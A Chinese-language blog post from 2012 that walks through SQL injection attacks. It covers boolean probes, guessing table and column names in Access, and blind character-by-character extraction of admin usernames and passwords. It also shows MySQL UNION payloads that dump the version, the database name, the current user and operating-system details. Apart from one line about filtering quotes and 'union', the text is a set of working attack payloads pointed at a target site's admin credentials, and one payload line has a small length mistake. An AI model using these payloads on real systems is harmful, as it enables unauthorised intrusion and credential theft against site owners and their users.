---
layout: post
title: "SQL注入攻击"
date: 2012-06-18 11:29
comments: true
categories: Computer
---
**SQL注入攻击**
最简单的说法就是由于程序编写的不规范，用户提交表单的相关代码安全性比较弱，这些提交的URL可以通过修改或者增加一些信息来获得一些本来不该获得信息。解决的办法就是对用户提交的表单进行特殊字符串的过滤，比如说‘和union。

**SQL注入攻击的检测**

主要分为数字型和字符型两种类型，分别又分为与真型和与非型。例如我们要得到的URL为http://abc.com/news.jsp?id=10

数值型：添加 and 1=1 和 and 1=2
字符型：分别为，http://abc.com/news.jsp?id=10' and '1'='1  http://abc.com/news.jsp?id=10'  and '1'='2

如果与真得到的与原网页相同，则就表示可以注入。

**几种不同的数据库的注入方法：**

**Access：**

1)判断是否可以注入，参照上面字符型和数字型的方法。

2）猜测表的名字
 
	and 0<>(select count(*) from *)
猜测表的名字，在后面的一个星号的位置填入你的想猜测的表的名字，例如：and 0<>(select count(*) from admin)就是猜测adimn这个表是否存在。如果返回的结果和原来的页面一样，就说明admin这张表是存在的。比较好用的办法是采用数据字典，将自己想猜测的表的名字放到一个文件中，通过程序读取文件，一个一个的猜测，运行和比较。

3）猜测字段数目，也就是一个表里的字段数目。
	
	and 0<(select count(*) from admin)
规则就是挨着测试，一次输入0，1，2，3……，如果当3还和原来页面一样，但是变成4就和原来的页面不一样了，那恭喜你，字段的数目就是4了。

4）猜测字段名称
	
	and 1=(select count(*) from admin where len(*)>0)
	and 1=(select count(*) from admin where len(name)>0)  //错误
	and 1=(select count(*) from admin where len(userName)>0) //正确
如上面的例子说明admin表中存在userName字段，但是不存在其他的字段。更多的字段猜测只能用数据字典用程序来做了。
<!--more-->
5）猜测各个字段的长度，例如上面我们刚得到的userName字段。
	
	and 1=(select count(*) from admin where len(userName)>0) //正确
	and 1=(select count(*) from admin where len(userName)>1) //正确
	and 1=(select count(*) from admin where len(userName)>2) //正确
	and 1=(select count(*) from admin where len(userName)>6) //错误
	and 1=(select count(*) from admin where len(userName)>5) //正确
	and 1=(select count(*) from admin where len(userName)>4) //正确
显然我们就能得到userName的字段的长度是6.

6）猜测字符

	and 1=(select count(*) from admin where left(userName,1)='a')  //猜解用户名字的第一位
	and 1=(select count(*) from admin where left(password,1)='a')  //猜解用户密码的第一位
直到反应正确才继续进行猜测下一位，由于在第5）部分中，我们已经得到了字段的长度，依次进行下去。

	and 1=(select count(*) from admin where left(userName,2)='ab')  //猜解用户名字的第二位
	and 1=(select count(*) from admin where left(password,1)='ab')  //猜解用户密码的第二位
7）找到登录窗口。这个靠运气吧，一般都在admin.jsp abc.com/admin/ etc.

**SQLServer的注入**的注入和Access的过程大致一样，可能在sql语句方面会有一些不同，请自己*google*。

**MySQL的注入**

MySQL注入的万能公式是这样的：

	union select 1,2,3...（查询字段）... from tableName
其中查询字段的位置可以放入我们想要查询的字段。
**具体的过程如下：**

1）确定字段的数目

	union select 1,1,1...1,1
依次增加上面的1的数目，得到最大的返回正确的页面，那个数字就是字段的数目。假设为4

2）确定表的名字

	union select 1,1,1,1 from admin
如果返回正确，则说明admin表是存在的，如果不存在，反复测试其他名称可以使用数据字典的方法，使用程序注入。

3）找字段，当然先找用户名和密码

	select 1,userName,3,4 from admin
如果返回正确，则说明admin表内有userName这个字段，同样的方法测试password的内容，当然，我们也可以先得到字段的长度，做法是在2）的后面加上order by num/*

4)得到一些系统的信息
	
	and 1=2 union all select version()/*  //数据库版本
	and 1=2 union all select database()/* //数据库名称
	and 1=2 union all select user()/*     //数据库当前链接的用户名
	and 1=2 union all select @@global.version_compile_os from mysql.user/* //操作系统的信息